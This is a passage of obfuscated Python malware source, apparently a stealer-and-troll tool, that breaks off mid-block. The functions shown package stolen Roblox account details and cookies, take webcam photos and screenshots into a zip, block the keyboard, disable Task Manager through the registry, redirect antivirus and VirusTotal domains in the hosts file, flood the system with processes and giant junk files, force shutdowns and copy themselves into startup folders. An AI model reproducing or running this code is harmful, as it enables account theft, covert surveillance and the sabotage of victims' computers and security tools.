                NWRKAGZDXXACUYCQXLOODUYLEZIZUAUQWKNLGGGNDLNAHUSMKSYBLXFRMIYQCTLFJGKTHPKLRVRSHKDOXHZIR = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('name', "None")
                DLFWAMLTMDEDVIURQFENUHTGKCQFSEORIDFQTXSRDEWMDZMQXZJNUMAEZRSFAFEY = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get("RobuxBalance", "None")
                ORYHGJTGAFMDOTWAWYEADCBTYIUBPUOSHEJLVZQJQMKDACQLXDKKCVNJWUXVXKOJWBKYPETHEIDBTVUNVHIXQDVKQNZSTOS = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get("IsPremium", "None")
                MAMMDSYTOVJKNEMHOOKHSGQNYMEDAIVFTXKBQWOZDKTWXKNUTQTKMJZCVSATCZLWGAVEB = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get("ThumbnailUrl", "None")
                RHYOSAVXAVBFYANVFDQWNWAMRRXNEXAYTIUESFPBMEPIMHOSOPODMGRJFQGXDAALC = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get("IsAnyBuildersClubMember", "None")
                
                BOXYOEUOYMVVTKUIXFKVRERPKDTQQNYPXRRAPEJRTXCXOXNONFVJZIRASJP = BOXYOEUOYMVVTKUIXFKVRERPKDTQQNYPXRRAPEJRTXCXOXNONFVJZIRASJP + f"""
Roblox Account n°{str(LVBHSDGVISAOFNXECQVBSNZGYAEHZWBEUYEUAWNKCRWUWZITSCTXWXFIVUULQLDOHIUUJYUSKCCPXUPXBZ)}:
 - Navigator     : {SLOBDQVPDRTFOCXHQEJJJYYIINANTSLVFIRHKYYNTEBGOGZHZTUOIGFYGKGWJFRLGDJRPRFQAOCOFCFLBZFYNJSUF}
 - Username      : {NWRKAGZDXXACUYCQXLOODUYLEZIZUAUQWKNLGGGNDLNAHUSMKSYBLXFRMIYQCTLFJGKTHPKLRVRSHKDOXHZIR}
 - DisplayName   : {COHNIUOQUHXIUYBXBBEROCZWXJVRBTQFRXNMLSLDTUVVGGKISYGRRPBDXVLRRLSYYXELCFRIUOEYHBFDFUQZDXFYAUTVPLE}
 - Id            : {MYGDIUSFLLONNCRLPVEXIOFIWBEEELSNADNMNNDNAMAKDAEPZUXC}
 - Avatar        : {MAMMDSYTOVJKNEMHOOKHSGQNYMEDAIVFTXKBQWOZDKTWXKNUTQTKMJZCVSATCZLWGAVEB}
 - Robux         : {DLFWAMLTMDEDVIURQFENUHTGKCQFSEORIDFQTXSRDEWMDZMQXZJNUMAEZRSFAFEY}
 - Premium       : {ORYHGJTGAFMDOTWAWYEADCBTYIUBPUOSHEJLVZQJQMKDACQLXDKKCVNJWUXVXKOJWBKYPETHEIDBTVUNVHIXQDVKQNZSTOS}
 - Builders Club : {RHYOSAVXAVBFYANVFDQWNWAMRRXNEXAYTIUESFPBMEPIMHOSOPODMGRJFQGXDAALC}
 - Cookie        : {v4r_c00ki3}
"""
                
    if not QEHTAKIEJIBWQSESENIZRAKLJJINTVFLZCIVMYNZMATMQKRDGVZKHTRSUTMMJSVEEAVUDAMHHLOQRVZNSWQYPMHYY:
        BOXYOEUOYMVVTKUIXFKVRERPKDTQQNYPXRRAPEJRTXCXOXNONFVJZIRASJP = "No roblox cookie found."
        
    TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.writestr(f"Roblox Accounts ({LVBHSDGVISAOFNXECQVBSNZGYAEHZWBEUYEUAWNKCRWUWZITSCTXWXFIVUULQLDOHIUUJYUSKCCPXUPXBZ}).txt", BOXYOEUOYMVVTKUIXFKVRERPKDTQQNYPXRRAPEJRTXCXOXNONFVJZIRASJP)

    return LVBHSDGVISAOFNXECQVBSNZGYAEHZWBEUYEUAWNKCRWUWZITSCTXWXFIVUULQLDOHIUUJYUSKCCPXUPXBZ

def PRCXCFHJGCLQAVKGABNUUOMVTMSUFTZLFVDRFTOCGMBBDOWRLETYBPHHNTOKBWIDUIQPYPNAJEHHSVQQLITMBSKG(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT):
    import cv2
    import io
    from PIL import Image

    try:
        MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture = "Yes"
        VZIKXSESPNRNNKNMSCYRFSOKAVRFUDFILBLVYOAAXAQZPWTATBWPMLDFDQKSCRIJLDXQYEWWMNNARKUNEYHAIL = cv2.VideoCapture(0)

        if not VZIKXSESPNRNNKNMSCYRFSOKAVRFUDFILBLVYOAAXAQZPWTATBWPMLDFDQKSCRIJLDXQYEWWMNNARKUNEYHAIL.isOpened():
            MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture = "No webcam found."
            return MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture

        v4r_ret, v4r_frame = VZIKXSESPNRNNKNMSCYRFSOKAVRFUDFILBLVYOAAXAQZPWTATBWPMLDFDQKSCRIJLDXQYEWWMNNARKUNEYHAIL.read()
        VZIKXSESPNRNNKNMSCYRFSOKAVRFUDFILBLVYOAAXAQZPWTATBWPMLDFDQKSCRIJLDXQYEWWMNNARKUNEYHAIL.release()

        if not v4r_ret:
            MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture = "Failed to capture image."
            UOAVJUXJTEJYTBJEKSJYSPNBVSLVZWQSUIVWMJZRGIZONVPEOUTLFDQGNWYJTOPHCEFFVZPOTEVLKOLUJTUHUPEOSCKSRSQ()
            return MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture

        EARVWAAROHCBDMTPDGXNPHKYNKTDJKXIGQCSSKGYIJNOVQVIHRUFVLWBKQZXXTOMTIWKQOR = cv2.cvtColor(v4r_frame, cv2.COLOR_BGR2RGB)
        KEIBBRRWCZSUFEBMWDBRRKEVXCKKIBMPGWMVTCZCNSCTADMKHTCUFZYNZSDWBTOQEJLRKAYQTJRSBYOEYDFVD = Image.fromarray(EARVWAAROHCBDMTPDGXNPHKYNKTDJKXIGQCSSKGYIJNOVQVIHRUFVLWBKQZXXTOMTIWKQOR)
        HVEIKOHHRJLLFQQZVXNSDYHFYELCTWTWOLNZWJUVIAAEHVCHCIXLNZNJYUFEBKJJJCNNTCCRVEEGOFMEMSMENLGIUUWWDZ = io.BytesIO()
        KEIBBRRWCZSUFEBMWDBRRKEVXCKKIBMPGWMVTCZCNSCTADMKHTCUFZYNZSDWBTOQEJLRKAYQTJRSBYOEYDFVD.save(HVEIKOHHRJLLFQQZVXNSDYHFYELCTWTWOLNZWJUVIAAEHVCHCIXLNZNJYUFEBKJJJCNNTCCRVEEGOFMEMSMENLGIUUWWDZ, format='PNG')
        HVEIKOHHRJLLFQQZVXNSDYHFYELCTWTWOLNZWJUVIAAEHVCHCIXLNZNJYUFEBKJJJCNNTCCRVEEGOFMEMSMENLGIUUWWDZ.seek(0)
        TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.writestr("Webcam.png", HVEIKOHHRJLLFQQZVXNSDYHFYELCTWTWOLNZWJUVIAAEHVCHCIXLNZNJYUFEBKJJJCNNTCCRVEEGOFMEMSMENLGIUUWWDZ.read())

        return MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture

    except Exception as e:
        MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture = f"Error: {e}"
        return MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture

def ZSBWPKJHAAVTJHGBHKKCCWMPGPNKOVOILSGZHKJBWAKXYYSEOXZVOHHXFWBLCYLDRTGUQDHUDC(zip_file):
    import io
    from PIL import ImageGrab

    try:
        WALGTAYTADYXQPRNSHQECYTBVHHPKZCDWDBLCXDTBARUDGPUGSSBIAK = "Yes"

        def C4ptur3():
            AKQWHQMBUPIZVTCELIYPEAOZBSVSWAARGJRTFFOQDNAJUHVHORDUQXDRVEKEFZDBQOASKHSRPWMWFSZKYDIXCSCZDTFJ = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            AKQWHQMBUPIZVTCELIYPEAOZBSVSWAARGJRTFFOQDNAJUHVHORDUQXDRVEKEFZDBQOASKHSRPWMWFSZKYDIXCSCZDTFJ_bytes = io.BytesIO()
            AKQWHQMBUPIZVTCELIYPEAOZBSVSWAARGJRTFFOQDNAJUHVHORDUQXDRVEKEFZDBQOASKHSRPWMWFSZKYDIXCSCZDTFJ.save(AKQWHQMBUPIZVTCELIYPEAOZBSVSWAARGJRTFFOQDNAJUHVHORDUQXDRVEKEFZDBQOASKHSRPWMWFSZKYDIXCSCZDTFJ_bytes, format='PNG')
            AKQWHQMBUPIZVTCELIYPEAOZBSVSWAARGJRTFFOQDNAJUHVHORDUQXDRVEKEFZDBQOASKHSRPWMWFSZKYDIXCSCZDTFJ_bytes.seek(0)
            return AKQWHQMBUPIZVTCELIYPEAOZBSVSWAARGJRTFFOQDNAJUHVHORDUQXDRVEKEFZDBQOASKHSRPWMWFSZKYDIXCSCZDTFJ_bytes

        AKQWHQMBUPIZVTCELIYPEAOZBSVSWAARGJRTFFOQDNAJUHVHORDUQXDRVEKEFZDBQOASKHSRPWMWFSZKYDIXCSCZDTFJ_bytes = C4ptur3()
        zip_file.writestr("Screenshot.png", AKQWHQMBUPIZVTCELIYPEAOZBSVSWAARGJRTFFOQDNAJUHVHORDUQXDRVEKEFZDBQOASKHSRPWMWFSZKYDIXCSCZDTFJ_bytes.read())
        return WALGTAYTADYXQPRNSHQECYTBVHHPKZCDWDBLCXDTBARUDGPUGSSBIAK
    except Exception as e:
        WALGTAYTADYXQPRNSHQECYTBVHHPKZCDWDBLCXDTBARUDGPUGSSBIAK = f"Error: {e}"
        return WALGTAYTADYXQPRNSHQECYTBVHHPKZCDWDBLCXDTBARUDGPUGSSBIAK

def RHOFYVYNDQAQMYJEQDCSREYEZRQKABZDSMSQRTASBAHSPQQWGRXAXFOFLKZNUZZNBMMRFKRLUANXXBKQTPDKOUTBCCMTIRDOO():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.block_key(k3y_b10ck)
        except: pass

def DIASDXENYGJKTCQMNNWSGTPDNZQEQJILADWCGXKQOZTXRJXMOQVURZNSVIRQTZSAOHGDCYMKFVAGPMLRDYSABJBI():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.unblock_key(k3y_b10ck)
        except: pass

def SCNWBIZFMDECDRAFUOTPJXSKIDTKXOXAKNPLWMXGENCFLHCMTZDZVZKBPVHVVMIHEZTOQJWMMFJKLIKXZFCNAYDYBOQRTCQQMYWU():
    import pyautogui
    pyautogui.FAILSAFE = False
    width, height = pyautogui.size()
    pyautogui.moveTo(width + 100, height + 100)

def ZTOZMACREVUBMZREOESEMPFLNKRAZBYIEWFGMGXUPHLYBBYGOQYUTUWGOUXXNNROXCJHKOCFMRVECNNANLMLQPJC():
    import psutil
    import subprocess
    import os

    "Perm Admin Required"
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Taskmgr.exe':
            proc.terminate()
            break
    subprocess.run("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def VUVPKEWFBFKQJKWTAIIPRTDSQJWTVDQDIZWPVCMOEEJDYXEZRJGACAOOPEPQSBU():
    import os

    "Perm Admin Required"
    try:
        def VUODAAFSWWJNRTKBWKLFANIWOGIIMHWDKCZIZSTSYKLRPDXQOMEESYMPGBSBAYRRHLXSMMAEIICVPTQPPLQWWPYEAG(CUYLHZNZMSCVYJPXQQVIILBMRZJDLLORXRGGGWFLDXCQBEDXONE):
            CUGESGOFCMIEKFIFCCIDMNZSDTYOHEBRFVQQNPTXJNQTUIOOFHDPPRJVUGYWVAITDTFSID = os.path.join(os.environ["WINDIR"], "System32", "drivers", "etc", "hosts")
            if not os.path.exists(CUGESGOFCMIEKFIFCCIDMNZSDTYOHEBRFVQQNPTXJNQTUIOOFHDPPRJVUGYWVAITDTFSID):
                CUGESGOFCMIEKFIFCCIDMNZSDTYOHEBRFVQQNPTXJNQTUIOOFHDPPRJVUGYWVAITDTFSID = os.path.join("C:", "Windows", "System32", "drivers", "etc", "hosts")

            NTBLMGRBDCGZNVLSMRFFNNWGIRSDGSMLXMGQLJYDQLHZTQMVSXKTIXHFGUJUFJNDMXF = "127.0.0.1"
            with open(CUGESGOFCMIEKFIFCCIDMNZSDTYOHEBRFVQQNPTXJNQTUIOOFHDPPRJVUGYWVAITDTFSID, "a") as v4r_file:
                v4r_file.write("\n" + NTBLMGRBDCGZNVLSMRFFNNWGIRSDGSMLXMGQLJYDQLHZTQMVSXKTIXHFGUJUFJNDMXF + " " + CUYLHZNZMSCVYJPXQQVIILBMRZJDLLORXRGGGWFLDXCQBEDXONE)
        
        BQOBBNEWDXERPSIXUTIZKYBFEIKISDVZQGPWMTYDICGXPKMTEZWPZJOOZHENIKSWUBYGR = [
            'virustotal.com', 
            'www.virustotal.com',
            'www.virustotal.com/gui/home/upload',
            'avast.com', 
            'totalav.com', 
            'scanguard.com', 
            'totaladblock.com', 
            'pcprotect.com', 
            'mcafee.com', 
            'bitdefender.com', 
            'us.norton.com', 
            'avg.com', 
            'malwarebytes.com', 
            'pandasecurity.com', 
            'avira.com', 
            'norton.com', 
            'eset.com', 
            'zillya.com', 
            'kaspersky.com', 
            'usa.kaspersky.com', 
            'sophos.com', 
            'home.sophos.com', 
            'adaware.com', 
            'bullguard.com', 
            'clamav.net', 
            'drweb.com', 
            'emsisoft.com', 
            'f-secure.com', 
            'zonealarm.com', 
            'trendmicro.com', 
            'ccleaner.com'
        ]

        for v4r_w3b51t3_t0_8l0ck in BQOBBNEWDXERPSIXUTIZKYBFEIKISDVZQGPWMTYDICGXPKMTEZWPZJOOZHENIKSWUBYGR:
            VUODAAFSWWJNRTKBWKLFANIWOGIIMHWDKCZIZSTSYKLRPDXQOMEESYMPGBSBAYRRHLXSMMAEIICVPTQPPLQWWPYEAG(v4r_w3b51t3_t0_8l0ck)
    except:
        pass

def CDLFWTNXYEZAXDSRXSQOGFUDCPMCNINFJLEYJAIRNDSOWEEUPIQLKLDBRNIOKGLLARSYXMM():
    import subprocess
    import threading

    def EOJCRUPPMNVSJDSEQBXFLRZOKPHDZQILCCANQVYRUYKCBWQLAUKDAPWPGZKXSRNAQCKVMUAZVBJN():
        programs = [
            'calc.exe',
            'notepad.exe',
            'mspaint.exe',
            'explorer.exe',    
        ]
        for program in programs:
            for _ in range(1):
                subprocess.Popen(program)
    
    def YCEPPHPNWUXPPPBNLVCJYVXCCFXJYFFXNNRJMPKDTOZLVZRSXRSRLRPJRTYPXSYQFPJKAGVKWQQXVXRBZCGTKUQATHIQKXUTEBMJ():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=EOJCRUPPMNVSJDSEQBXFLRZOKPHDZQILCCANQVYRUYKCBWQLAUKDAPWPGZKXSRNAQCKVMUAZVBJN)
                t.start()
                threads.append(t)
        except:
            pass

        for thread in threads:
            thread.join()

    YCEPPHPNWUXPPPBNLVCJYVXCCFXJYFFXNNRJMPKDTOZLVZRSXRSRLRPJRTYPXSYQFPJKAGVKWQQXVXRBZCGTKUQATHIQKXUTEBMJ()

def EVSKPOFKKALENOWIDTYJHSJJCOJNSTYTWDKUIEDRBDPETKINVONBAJUAHNRLHVCNMTHIUZBRSKIIFTAOENXPV():
    import random
    import string
    import threading

    ext = [".exe", ".py", ".txt", ".png", ".ico", ".bat", 
           ".js", ".php", ".html", ".css", ".mp3", ".mp4", 
           ".mov", ".jpg", ".pdf", ".troll", ".cooked",
           ".lol", ".funny", ".virus", ".malware"
           ".Elite", ".Elite", ".Elite", ".Elite"
    ]
    def NPSYEOSPYJOQMQRAGOPUKVOVFUMNLHSUFTEDEWWSGTYLUVLZEKERJNJSOQJQVEYBWRMYWIDVDWJMDQ():
        file_name = "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(10, 50))) + random.choice(ext)

        with open(file_name, 'w', encoding='utf-8') as file:
            file.write(("".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(999999)))) * random.randint(9999999999999999999999999, 9999999999999999999999999999999999999999)

    def YCEPPHPNWUXPPPBNLVCJYVXCCFXJYFFXNNRJMPKDTOZLVZRSXRSRLRPJRTYPXSYQFPJKAGVKWQQXVXRBZCGTKUQATHIQKXUTEBMJ():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=NPSYEOSPYJOQMQRAGOPUKVOVFUMNLHSUFTEDEWWSGTYLUVLZEKERJNJSOQJQVEYBWRMYWIDVDWJMDQ)
                t.start()
                threads.append(t)
        except:
            pass

        for thread in threads:
            thread.join()

    YCEPPHPNWUXPPPBNLVCJYVXCCFXJYFFXNNRJMPKDTOZLVZRSXRSRLRPJRTYPXSYQFPJKAGVKWQQXVXRBZCGTKUQATHIQKXUTEBMJ()

def FZMJGYDFKWYQQVTOWNOQBLVYEIQNJLKAPPQRBRWICWMMOCGUTZIPGYZJSYILHJKKNYKJYRVFNV():
    import sys
    import os
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 15')
    elif sys.platform.startswith('linux'):
        os.system('shutdown -h +0.25')

def St4rtup():
    import os
    import sys
    import shutil

    try:
        OQZEVWNGUGHJMNWDRGEVTXQKMWGDMJMXHHNUDIIHKNMQJUDIGCLFQMPCBEWSJAJLCGTH = os.path.abspath(sys.argv[0])

        if OQZEVWNGUGHJMNWDRGEVTXQKMWGDMJMXHHNUDIIHKNMQJUDIGCLFQMPCBEWSJAJLCGTH.endswith(".exe"):
            BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAI = "exe"
        elif OQZEVWNGUGHJMNWDRGEVTXQKMWGDMJMXHHNUDIIHKNMQJUDIGCLFQMPCBEWSJAJLCGTH.endswith(".py"):
            BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAI = "py"

        HZSMRMJWOCMWJIHPUAYVSEXSYWPOWHYGCOZCOGXUKTQBCILBLFPRQKEWAYWKYSBIW = f"ㅤ.{BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAI}"

        if sys.platform.startswith('win'):  
            VMCPYYLKLTDECAXXYIEFJXHCBZNOLHJBUWVJCEGNPTYVQPSJUFOORROIYQSPNDBJBCZRZAZMBDWS = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            VMCPYYLKLTDECAXXYIEFJXHCBZNOLHJBUWVJCEGNPTYVQPSJUFOORROIYQSPNDBJBCZRZAZMBDWS = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            VMCPYYLKLTDECAXXYIEFJXHCBZNOLHJBUWVJCEGNPTYVQPSJUFOORROIYQSPNDBJBCZRZAZMBDWS = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL_new_file = os.path.join(VMCPYYLKLTDECAXXYIEFJXHCBZNOLHJBUWVJCEGNPTYVQPSJUFOORROIYQSPNDBJBCZRZAZMBDWS, HZSMRMJWOCMWJIHPUAYVSEXSYWPOWHYGCOZCOGXUKTQBCILBLFPRQKEWAYWKYSBIW)

        shutil.copy(OQZEVWNGUGHJMNWDRGEVTXQKMWGDMJMXHHNUDIIHKNMQJUDIGCLFQMPCBEWSJAJLCGTH, LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL_new_file)
        os.chmod(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL_new_file, 0o777) 
    except:
        pass

def EOJCRUPPMNVSJDSEQBXFLRZOKPHDZQILCCANQVYRUYKCBWQLAUKDAPWPGZKXSRNAQCKVMUAZVBJNOpti0ns():
    import keyboard
    while True:
        try:
            SCNWBIZFMDECDRAFUOTPJXSKIDTKXOXAKNPLWMXGENCFLHCMTZDZVZKBPVHVVMIHEZTOQJWMMFJKLIKXZFCNAYDYBOQRTCQQMYWU()
            CDLFWTNXYEZAXDSRXSQOGFUDCPMCNINFJLEYJAIRNDSOWEEUPIQLKLDBRNIOKGLLARSYXMM()
            EVSKPOFKKALENOWIDTYJHSJJCOJNSTYTWDKUIEDRBDPETKINVONBAJUAHNRLHVCNMTHIUZBRSKIIFTAOENXPV()
            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
                Unb10ck_K3y()
                break
        except:
            pass

TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE = []

ZTJWVQWWWLUNQOXYCSKCPGAAAOVWANLCEAOFXIMSREVDZBFGOCUHPGLORDEAIPXHMVPMSKPOVWDHGBMIPFCBQIJPLTLALFA = io.BytesIO()
with zipfile.ZipFile(ZTJWVQWWWLUNQOXYCSKCPGAAAOVWANLCEAOFXIMSREVDZBFGOCUHPGLORDEAIPXHMVPMSKPOVWDHGBMIPFCBQIJPLTLALFA, "w", zipfile.ZIP_DEFLATED) as TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT:

    try: 
        FFINAXAURGQGKCPFDVSBNGUAJJLFDUQPBISTNRVNUCZZVGFBUEXSQXZDZJAQCHQY = FFDZXZNIFUJEZDMBSIVTPCTFJVAKLKUBRRJKIKVVJNPAWBYNHPPGYGNBEMGCYKCRCBIIUKHBMOSLCDZOFRDAJUQLYKGWH()
    except Exception as e:
        FFINAXAURGQGKCPFDVSBNGUAJJLFDUQPBISTNRVNUCZZVGFBUEXSQXZDZJAQCHQY = f"Error: {e}"

    try: 
        MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_system_info = EGTKBTIGJFMLNOSNNQJQQLTDABEMQVNYZLBSWWDWFYLVUWBVLJJRQBL(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT)
    except Exception as e:
        MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_system_info = f"Error: {e}"

    try: 
        CSGWQNYOPUUJUKJYRLYLLDRJAMEBYWUGAXDOSWZGJROQHYSSXSMCNZ = UTNSRPLYYTEYDMRKLYDJBHIJVUZHBATXJNHPCEEPVYIMDKSONRYKTFHFUGNHVMKJPKAHOKHPQYAMWZWXBYBZQIJWVNCUAYJBSDM(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT)
    except Exception as e:
        CSGWQNYOPUUJUKJYRLYLLDRJAMEBYWUGAXDOSWZGJROQHYSSXSMCNZ = f"Error: {e}"

    try: 
        YGIBLHTDRVQNOCHHJQRJEYIYXRPUMFUHJEJLDCLNFTIDJENPCUHLFBMIDE, LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA, KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ, MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM, KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT, UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD = RNATGZQLGLKBFCVWWNGENRVGNPDGFCSRZGSQVJTJDKIFZAJDTIFQWWFWTOAOAMMCHMUQYLPDDRRO(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT)
    except Exception as e:
        YGIBLHTDRVQNOCHHJQRJEYIYXRPUMFUHJEJLDCLNFTIDJENPCUHLFBMIDE = f"Error: {e}"
        LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA = f"Error: {e}"
        KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ = f"Error: {e}"
        MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM = f"Error: {e}"
        KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT = f"Error: {e}"
        UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD = f"Error: {e}"

    try: 
        LVBHSDGVISAOFNXECQVBSNZGYAEHZWBEUYEUAWNKCRWUWZITSCTXWXFIVUULQLDOHIUUJYUSKCCPXUPXBZ = DIBGEOWRGKSEAFMXIFUVRDOCXAULLPLZUFQLJSPMITIPBEXUUDYJZRNKYMKYHXZALUWORJQPEHOHOQLVVYJ(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT)
    except Exception as e:
        LVBHSDGVISAOFNXECQVBSNZGYAEHZWBEUYEUAWNKCRWUWZITSCTXWXFIVUULQLDOHIUUJYUSKCCPXUPXBZ = f"Error: {e}"

    try: 
        MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture = PRCXCFHJGCLQAVKGABNUUOMVTMSUFTZLFVDRFTOCGMBBDOWRLETYBPHHNTOKBWIDUIQPYPNAJEHHSVQQLITMBSKG(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT)
    except Exception as e:
